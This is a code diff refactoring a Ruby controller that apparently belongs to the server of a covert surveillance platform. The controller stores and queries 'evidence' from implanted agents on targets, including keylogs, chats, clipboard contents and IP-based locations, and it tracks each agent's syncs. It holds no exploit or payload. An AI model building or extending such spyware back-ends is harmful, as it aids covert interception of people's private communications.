@@ -6,7 +6,7 @@ require_relative '../db_layer'
 require_relative '../evidence_manager'
 require_relative '../evidence_dispatcher'
 require_relative '../position/resolver'
-require_relative '../connectors'
+require_relative '../connector_manager'
 
 # rcs-common
 require 'rcs-common/symbolize'
@@ -57,7 +57,7 @@ class EvidenceController < RESTController
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found: #{@params['target']}") if target.nil?
 
-      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
+      evidence = Evidence.target(target[:_id]).find(@params['_id'])
       @params.delete('_id')
       @params.delete('target')
 
@@ -89,7 +89,7 @@ class EvidenceController < RESTController
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found: #{@params['target']}") if target.nil?
 
-      evidence = Evidence.collection_class(target[:_id]).where({_id: @params['_id']}).without(:kw).first
+      evidence = Evidence.target(target[:_id]).where({_id: @params['_id']}).without(:kw).first
 
       # get a fresh decoding of the position
       if evidence[:type] == 'position'
@@ -111,7 +111,7 @@ class EvidenceController < RESTController
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found: #{@params['target']}") if target.nil?
 
-      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
+      evidence = Evidence.target(target[:_id]).find(@params['_id'])
       agent = Item.find(evidence[:aid])
       agent.stat.evidence[evidence.type] -= 1 if agent.stat.evidence[evidence.type]
       agent.stat.size -= evidence.data.to_s.length
@@ -152,7 +152,7 @@ class EvidenceController < RESTController
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found: #{@params['target']}") if target.nil?
 
-      evidence = Evidence.collection_class(target[:_id]).where({_id: @params['_id']}).without(:kw).first
+      evidence = Evidence.target(target[:_id]).where({_id: @params['_id']}).without(:kw).first
 
       # add to the translation queue
       if LicenseManager.instance.check(:translation) and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
@@ -172,7 +172,7 @@ class EvidenceController < RESTController
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found: #{@params['target']}") if target.nil?
 
-      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
+      evidence = Evidence.target(target[:_id]).find(@params['_id'])
 
       return ok(evidence.data['body'], {content_type: 'text/html'})
     end
@@ -181,31 +181,39 @@ class EvidenceController < RESTController
   # used to report that the activity of an instance is starting
   def start
     require_auth_level :server, :tech_import
-    
+
     # create a phony session
     session = @params.symbolize
-    
+
     # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
     return not_found("Agent not found: #{session[:bid]}") if agent.nil?
-    
-    # convert the string time to a time object to be passed to 'sync_start'
-    time = Time.at(@params['sync_time']).getutc
 
+    ConnectorManager.process_sync_event(agent, :sync_start, @params)
+
+    sync_start(agent, @params)
+
+    return ok
+  end
+
+  def sync_start(agent, params)
+    time = Time.at(params['sync_time']).getutc
+
+    # convert the string time to a time object to be passed to 'sync_start'
     trace :info, "#{agent[:name]} sync started [#{agent[:ident]}:#{agent[:instance]}]"
 
     # update the agent version
-    agent.version = @params['version']
+    agent.version = params['version']
 
     # reset the counter for the dashboard
     agent.reset_dashboard
-    
+
     # update the stats
     agent.stat[:last_sync] = time
     agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IN_PROGRESS
-    agent.stat[:source] = @params['source']
-    agent.stat[:user] = @params['user']
-    agent.stat[:device] = @params['device']
+    agent.stat[:source] = params['source']
+    agent.stat[:user] = params['user']
+    agent.stat[:device] = params['device']
     agent.save
 
     # update the stat of the target
@@ -224,10 +232,9 @@ class EvidenceController < RESTController
     # check for alerts on this agent
     Alerting.new_sync agent
 
-    # remember the address of each sync
-    insert_sync_address(target, agent, @params['source'])
+    insert_sync_address(target, agent, params['source'])
 
-    return ok
+    Item.send_dashboard_push(agent, target, operation)
   end
 
   def insert_sync_address(target, agent, address)
@@ -236,7 +243,7 @@ class EvidenceController < RESTController
     position = PositionResolver.get({'ipAddress' => {'ipv4' => address}})
 
     # add the evidence to the target
-    ev = Evidence.dynamic_new(target[:_id])
+    ev = ::Evidence.dynamic_new(target[:_id])
     ev.type = 'ip'
     ev.da = Time.now.getutc.to_i
     ev.dr = Time.now.getutc.to_i
@@ -244,8 +251,6 @@ class EvidenceController < RESTController
     ev[:data] = {content: address}
     ev[:data] = ev[:data].merge(position)
     ev.save
-
-    Connectors.new_evidence(ev)
   end
 
   # used by the collector to update the synctime during evidence transfer
@@ -286,6 +291,8 @@ class EvidenceController < RESTController
     operation.stat[:last_child] = [target[:_id]]
     operation.save
 
+    Item.send_dashboard_push(agent, target, operation)
+
     return ok
   end
 
@@ -300,13 +307,24 @@ class EvidenceController < RESTController
     agent = Item.where({_id: session[:bid]}).first
     return not_found("Agent not found: #{session[:bid]}") if agent.nil?
 
+    ConnectorManager.process_sync_event(agent, :sync_stop)
+
+    sync_stop(agent)
+
+    return ok
+  end
+
+  def sync_stop(agent, params = {})
     trace :info, "#{agent[:name]} sync end [#{agent[:ident]}:#{agent[:instance]}]"
 
     agent.stat[:last_sync] = Time.now.getutc.to_i
     agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
     agent.save
 
-    return ok
+    target = agent.get_parent
+    operation = target.get_parent
+
+    Item.send_dashboard_push(agent, target, operation)
   end
 
   # used to report that the activity on an instance has timed out
@@ -320,11 +338,19 @@ class EvidenceController < RESTController
     agent = Item.where({_id: session[:bid]}).first
     return not_found("Agent not found: #{session[:bid]}") if agent.nil?
 
+    ConnectorManager.process_sync_event(agent, :sync_timeout)
+
+    sync_timeout(agent)
+
+    return ok
+  end
+
+  def sync_timeout(agent, params = {})
+    trace :info, "#{agent[:name]} sync timeouted [#{agent[:ident]}:#{agent[:instance]}]"
+
     agent.stat[:last_sync] = Time.now.getutc.to_i
     agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_TIMEOUTED
     agent.save
-
-    return ok
   end
 
   def index
@@ -339,7 +365,7 @@ class EvidenceController < RESTController
       geo_near_accuracy = filter_hash.delete('geoNear_accuracy')
 
       # copy remaining filtering criteria (if any)
-      filtering = Evidence.collection_class(target[:_id]).stats_relevant
+      filtering = Evidence.target(target[:_id]).stats_relevant
       filter.each_key do |k|
         filtering = filtering.any_in(k.to_sym => filter[k])
       end
@@ -375,7 +401,7 @@ class EvidenceController < RESTController
       geo_near_accuracy = filter_hash.delete('geoNear_accuracy')
 
       # copy remaining filtering criteria (if any)
-      filtering = Evidence.collection_class(target[:_id]).stats_relevant
+      filtering = Evidence.target(target[:_id]).stats_relevant
       filter.each_key do |k|
         filtering = filtering.any_in(k.to_sym => filter[k])
       end
@@ -403,7 +429,7 @@ class EvidenceController < RESTController
       return not_found("Target or Agent not found") if filter.nil?
 
       # copy remaining filtering criteria (if any)
-      filtering = Evidence.collection_class(target[:_id]).where({:type => 'info'})
+      filtering = Evidence.target(target[:_id]).where({:type => 'info'})
       filter.each_key do |k|
         filtering = filtering.any_in(k.to_sym => filter[k])
       end
@@ -438,7 +464,7 @@ class EvidenceController < RESTController
       end
 
       stats = []
-      Evidence.collection_class(target).count_by_type(condition).each do |type, count|
+      Evidence.target(target).count_by_type(condition).each do |type, count|
         stats << {type: type, count: count}
       end
 
@@ -468,7 +494,7 @@ class EvidenceController < RESTController
       end
 
       # copy remaining filtering criteria (if any)
-      filtering = Evidence.collection_class(target[:_id]).where({:type => 'filesystem'})
+      filtering = Evidence.target(target[:_id]).where({:type => 'filesystem'})
       filtering = filtering.any_in(:aid => [agent[:_id]]) unless agent.nil?
 
       if @params['filter']
@@ -506,7 +532,7 @@ class EvidenceController < RESTController
       return not_found("Target or Agent not found") if filter.nil?
 
       # copy remaining filtering criteria (if any)
-      filtering = Evidence.collection_class(target[:_id]).where({:type => 'command'})
+      filtering = Evidence.target(target[:_id]).where({:type => 'command'})
       filter.each_key do |k|
         filtering = filtering.any_in(k.to_sym => filter[k])
       end
@@ -528,7 +554,7 @@ class EvidenceController < RESTController
       return not_found("Target or Agent not found") if filter.nil?
 
       # copy remaining filtering criteria (if any)
-      filtering = Evidence.collection_class(target[:_id]).where({:type => 'ip'})
+      filtering = Evidence.target(target[:_id]).where({:type => 'ip'})
       filter.each_key do |k|
         filtering = filtering.any_in(k.to_sym => filter[k])
       end
@@ -540,7 +566,7 @@ class EvidenceController < RESTController
     end
   end
 
-
+  private :insert_sync_address, :sync_start, :sync_stop, :sync_timeout
 end
 
 end #DB::
